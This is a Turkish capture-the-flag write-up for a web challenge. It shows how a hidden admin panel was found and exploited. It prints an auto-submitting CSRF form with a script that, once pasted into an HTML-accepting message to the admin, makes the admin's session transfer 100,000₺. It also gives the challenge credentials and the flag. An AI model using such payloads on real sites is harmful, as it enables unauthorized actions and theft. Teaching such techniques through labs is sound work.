# Geri Dön Geri Dön

|    |  |
| ------------- |-------------|
| Zorluk        | Çetin (750 puan)|
| Aşama         | Final    |
| Soru Türü     | Web Güvenliği |
| Yazar(lar)    | [İbrahim CAN](http://github.com/cibrx) |

## Soru Metni

> Urbatek firmasında çalışan zigzantares bir anlaşmazlık sonucu işten ayrılmıştır. Firma 100.000₺ olan tazminat borcunu ödememekte ısrar etmektedir. İşte kullanıcının giriş bilgileri:
>
> - **Kullanıcı Adı:** zigzantares  
> - **Parola:** geriDonGeriiiDoonNeolurgeriidoon

---

## Çözüm

Siteye giriş yaptığımızda kullanıcı adı ve parola ile oturum açabileceğimiz bir giriş ekranı görüyoruz. Verilen bilgilerle oturum açtıktan sonra karşımıza iki sekme çıkıyor:

- **Ana Sayfa**
- **Profil**


Ana sayfada "Admine Mesaj Gönder" adlı bir form yer alıyor. Bu form sayesinde admin kullanıcıya mesaj gönderebiliyoruz. İlginç olan, bu form HTML içerik kabul ediyor. Bu da XSS veya CSRF gibi açıklar için bir alan oluşturuyor.

Sayfanın kaynak kodunu incelediğimizde şu tarz bir yorum satırı görüyoruz:

```html
<!-- admin panel: http://soru.bayraksende.com:1453/admin -->
```

Bu adresi ziyaret ettiğimizde panel kısa bir süre görünüyor ve ardından "Yetkisiz Erişim" uyarısı çıkıyor.
Bu, sadece yetkili kullanıcıların bu sayfaya erişebildiğini gösteriyor.
Ancak bir proxy (ör. Burp Suite) yardımıyla sayfanın tam HTML içeriğini analiz edebiliyoruz.

Proxy üzerinden eriştiğimiz admin panelinde şöyle bir form bulunuyor:

```html
<form id="sendMoneyForm" class="send-money-form" action="/api/para-gonder" method="POST">
    <input type="number" name="id" placeholder="id" value="1">
    <input type="number" name="bakiye" placeholder="bakiye" value="100000">
    <button type="submit">Gönder</button>
</form>

```
Bu form, /api/para-gonder adresine POST isteği gönderiyor. Ancak biz kendi hesabımızdan bu isteği göndermeye çalıştığımızda "Yetkisiz" hatası alıyoruz. Yani bu endpoint sadece admin kullanıcılar tarafından kullanılabiliyor.
Cookie’leri incelediğimizde HttpOnly: true olarak ayarlandığını görüyoruz. Bu, XSS ile oturum bilgilerini çalmayı engelliyor.
Ancak mesaj formu HTML kabul ettiği için, burada CSRF saldırısı gerçekleştirebiliriz.

### CSRF Payload'u

Admin panelindeki formu kopyalayıp otomatik olarak submit olacak şekilde şu payload'u hazırlıyoruz:
```
<form id="sendMoneyForm" action="/api/para-gonder" method="POST">
    <input type="hidden" name="id" value="1"> <!-- bizim kullanıcı ID'miz -->
    <input type="hidden" name="bakiye" value="100000"> <!-- gönderilmesini istediğimiz bakiye -->
</form>
<script>
    document.getElementById("sendMoneyForm").submit();
</script>
```

Bu formu "Admine Mesaj Gönder" alanına HTML olarak yapıştırıyoruz. Böylece admin mesajı görüntülediği anda form arka planda gönderiliyor. Admin’in oturum bilgileriyle bize 100.000₺ aktarılıyor.

Profil sayfasına tekrar döndüğümüzde, hesabımızda 100.000₺ olduğunu görüyoruz.


## Flag

```
BayrakBende{B4yr4kB3nd34dm1nl3r1TumL1nkl3r3T1kl1y0r}
```
